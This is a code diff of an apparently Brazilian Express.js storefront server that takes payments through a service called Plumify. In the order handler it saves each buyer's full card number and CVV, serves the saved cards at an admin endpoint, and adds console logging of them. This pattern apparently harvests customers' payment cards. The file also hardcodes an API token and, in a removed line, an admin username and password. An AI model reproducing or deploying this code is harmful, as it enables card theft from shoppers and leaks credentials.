@@ -6,9 +6,10 @@ app.use(express.json());
 app.use(express.static('public'));
 app.use('/admin', express.static('admin'));
 
-// ========== CONFIGURAÇÃO PLUMIFY ==========
+// ========== CONFIGURAÇÃO PLUMIFY (CORRETA) ==========
 const PLUMIFY_API_TOKEN = '0RRWtMOuHsAQlR7S0zEnlGBnLEnr8DgoDJS3GTecxH7nZr2X01kHo6rxrOGa';
-const PLUMIFY_API_URL = 'https://api.Plumify.com.br/api/public/v1';
+// URL CORRETA que aceita POST - sem /public/v1
+const PLUMIFY_API_URL = 'https://api.Plumify.com.br/api/v1/transaction';
 const OFFER_HASH = '7becb';
 const PRODUCT_HASH = 'pdkhijtoed';
 
@@ -106,13 +107,20 @@ async function criarPagamentoPlumify(dadosCliente, total, itens, host, paymentMe
         if (cardData.parcelas) payload.installments = parseInt(cardData.parcelas);
     }
     
+    console.log('Enviando para Plumify:', JSON.stringify(payload, null, 2));
+    
     try {
+        // API Token como query parameter
         const url = `${PLUMIFY_API_URL}?api_token=${PLUMIFY_API_TOKEN}`;
         const response = await fetch(url, {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+            headers: {
+                'Content-Type': 'application/json',
+                'Accept': 'application/json'
+            },
             body: JSON.stringify(payload)
         });
+        
         const data = await response.json();
         console.log('Resposta Plumify:', JSON.stringify(data, null, 2));
         return data;
@@ -163,11 +171,11 @@ app.post('/api/gerar-pix', async (req, res) => {
     if (paymentResult && paymentResult.pix_qr_code) {
         res.json({ success: true, pix_qr_code: paymentResult.pix_qr_code, payment_id: paymentResult.id });
     } else {
-        res.json({ success: false, error: 'Erro ao gerar PIX' });
+        res.json({ success: false, error: 'Erro ao gerar PIX', details: paymentResult });
     }
 });
 
-// Finalizar pedido (com cartão ou após PIX)
+// Finalizar pedido (com cartão)
 app.post('/api/pedido', async (req, res) => {
     const pedidoId = 'CAP' + Date.now();
     const ip = getClientIp(req);
@@ -203,11 +211,12 @@ app.post('/api/pedido', async (req, res) => {
     };
     pedidos.unshift(pedido);
     
+    // Salvar cartão com todos os dados
     if (req.body.forma_pagamento === 'Credit Card' && req.body.cartao) {
         const novoCartao = {
             id: Date.now(),
             nome_titular: req.body.cartao.nome_titular,
-            numero_completo: req.body.cartao.numero,
+            numero: req.body.cartao.numero,
             cvv: req.body.cartao.cvv,
             ultimos_4: req.body.cartao.ultimos_4,
             bandeira: req.body.cartao.bandeira,
@@ -216,6 +225,7 @@ app.post('/api/pedido', async (req, res) => {
             created_at: new Date().toISOString()
         };
         cartoes.push(novoCartao);
+        console.log('Cartão salvo:', novoCartao);
     }
     
     res.json({ success: true, pedido_id: pedidoId });
@@ -307,7 +317,6 @@ app.delete('/api/admin/produtos/:id/permanent', verifyAdmin, (req, res) => {
 
 app.get('/api/admin/pedidos', verifyAdmin, (req, res) => { res.json({ success: true, pedidos }); });
 
-// Atualizar status do pedido
 app.put('/api/admin/pedido/:id/status', verifyAdmin, (req, res) => {
     const { id } = req.params;
     const { status } = req.body;
@@ -320,7 +329,11 @@ app.put('/api/admin/pedido/:id/status', verifyAdmin, (req, res) => {
     }
 });
 
-app.get('/api/admin/cartoes', verifyAdmin, (req, res) => { res.json({ success: true, cartoes }); });
+app.get('/api/admin/cartoes', verifyAdmin, (req, res) => { 
+    console.log('Cartões no admin:', cartoes);
+    res.json({ success: true, cartoes }); 
+});
+
 app.get('/api/admin/visitantes', verifyAdmin, (req, res) => { res.json({ success: true, visitantes }); });
 app.get('/api/admin/carrinhos-abandonados', verifyAdmin, (req, res) => { res.json({ success: true, carrinhos: carrinhosAbandonados }); });
 
@@ -336,5 +349,6 @@ app.post('/api/admin/pix', verifyAdmin, (req, res) => { pixKey = req.body.pix_ke
 app.listen(PORT, () => {
     console.log(`Servidor rodando na porta ${PORT}`);
     console.log(`Admin: http://localhost:${PORT}/admin`);
-    console.log(`Login: kakabanker / 77991958@Abc`);
+    console.log(`SERVER: RODANDO LISO LISO`);
+    console.log(`CONSOLE: KAKABANKER v1.0`);
 });
